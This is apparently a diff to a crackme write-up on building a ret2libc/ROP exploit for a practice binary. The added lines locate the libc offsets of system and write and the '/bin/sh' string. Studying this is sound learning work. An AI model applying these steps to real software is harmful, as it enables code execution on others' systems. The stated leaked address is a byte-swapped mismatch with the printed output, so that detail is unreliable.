@@ -285,11 +285,20 @@ print(hex(write_libc))
 ❯ python translate_libc.py
 0x7f027fd0dde0
 ```
-Amazing! Our libc address is `0xe0ddd07f027f0000`! Now, this only proves our exploit so far works, because this address is different every runtime as libc does not live inside our binary. Every function inside of libc lives at a fixed offset of our libc address, which never changes within a given libc version.
+Amazing! Our libc address is `0xe0ddd07f027f0000`! Now, this only proves our exploit so far works, because this address is different every runtime as libc does not live inside our binary. Because of this, the entire script will have to be a single big exploit doing all steps at once. Every function inside of libc lives at a fixed offset of our libc address, which never changes within a given libc version.
 ```
 ~/Projects/RE/crackmes.one/rop
 ❯ ldd ./rop
         linux-vdso.so.1 (0x00007f77bda05000)
         libc.so.6 => /usr/lib/libc.so.6 (0x00007f77bd600000)
         /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f77bda07000)
+
+~/Projects/RE/crackmes.one/rop
+❯ readelf -s /usr/lib/libc.so.6 | grep -E " write@@| system@@"
+  1064: 0000000000053b00    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+  2976: 000000000010dde0    32 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
+
+~/Projects/RE/crackmes.one/rop
+❯ strings -t x /usr/lib/libc.so.6 | grep "/bin/sh"
+ 1b01aa /bin/sh
 ```
